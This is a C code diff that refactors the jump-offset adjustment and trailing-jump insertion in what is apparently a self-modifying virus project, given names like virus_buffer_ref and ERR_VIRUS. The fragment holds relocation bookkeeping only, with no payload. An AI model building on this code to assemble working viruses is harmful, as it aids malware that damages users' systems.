@@ -284,24 +284,19 @@ static bool	adjust_jumps(struct safe_ptr virus_buffer_ref,
 {
 	for (size_t i = 0; i < b->njumps; i++)
 	{
-		struct jump	*j      = &b->jumps[i];
-		size_t	jump_value_addr = (size_t)j->value_addr;
-		int32_t	jump_value      = j->value + j->value_shift;
-		uint8_t	jump_size       = j->value_size;
+		const struct jump	*j = &b->jumps[i];
+		const void	*jump_value_addr = j->value_addr;
+		const int32_t	jump_value = j->value + j->value_shift;
 
-		size_t	block_start  = (size_t)b->ref.ptr;
-		size_t	output_start = (size_t)virus_buffer_ref.ptr;
+		const void	*block_start = b->ref.ptr;
+		const void	*buffer_start = virus_buffer_ref.ptr;
 
-		size_t	block_offset = (size_t)block_buffer - output_start;
-		size_t	jump_value_offset = jump_value_addr - block_start;
+		const size_t	block_offset = block_buffer - buffer_start;
+		const size_t	jump_offset = jump_value_addr - block_start;
+		const size_t	dst_offset = block_offset + jump_offset;
 
-		void	*jump_buffer = safe(virus_buffer_ref, block_offset +
-					jump_value_offset, jump_size);
-
-		if (jump_buffer == NULL)
-			return errors(ERR_VIRUS, _ERR_V_ADJUST_JUMPS);
-
-		write_jump_arg(jump_buffer, jump_value, jump_size);
+		if (!write_jump32_value(virus_buffer_ref, dst_offset, jump_value))
+			return errors(ERR_THROW, _ERR_T_ADJUST_JUMPS);
 	}
 	return true;
 }
@@ -345,7 +340,9 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref,
 	if (tj_end + rel_jump != tb_start)
 		return errors(ERR_VIRUS, _ERR_V_BAD_TRAILING_JUMP);
 
-	write_jump(tj_buffer, rel_jump, DWORD);
+	if (!write_jump32(virus_buffer_ref, tj_offset, rel_jump))
+		return errors(ERR_THROW, _ERR_T_ADD_TRAILING_JUMP);
+
 	*virus_buffer_size += JUMP32_INST_SIZE;
 end:
 	return true;
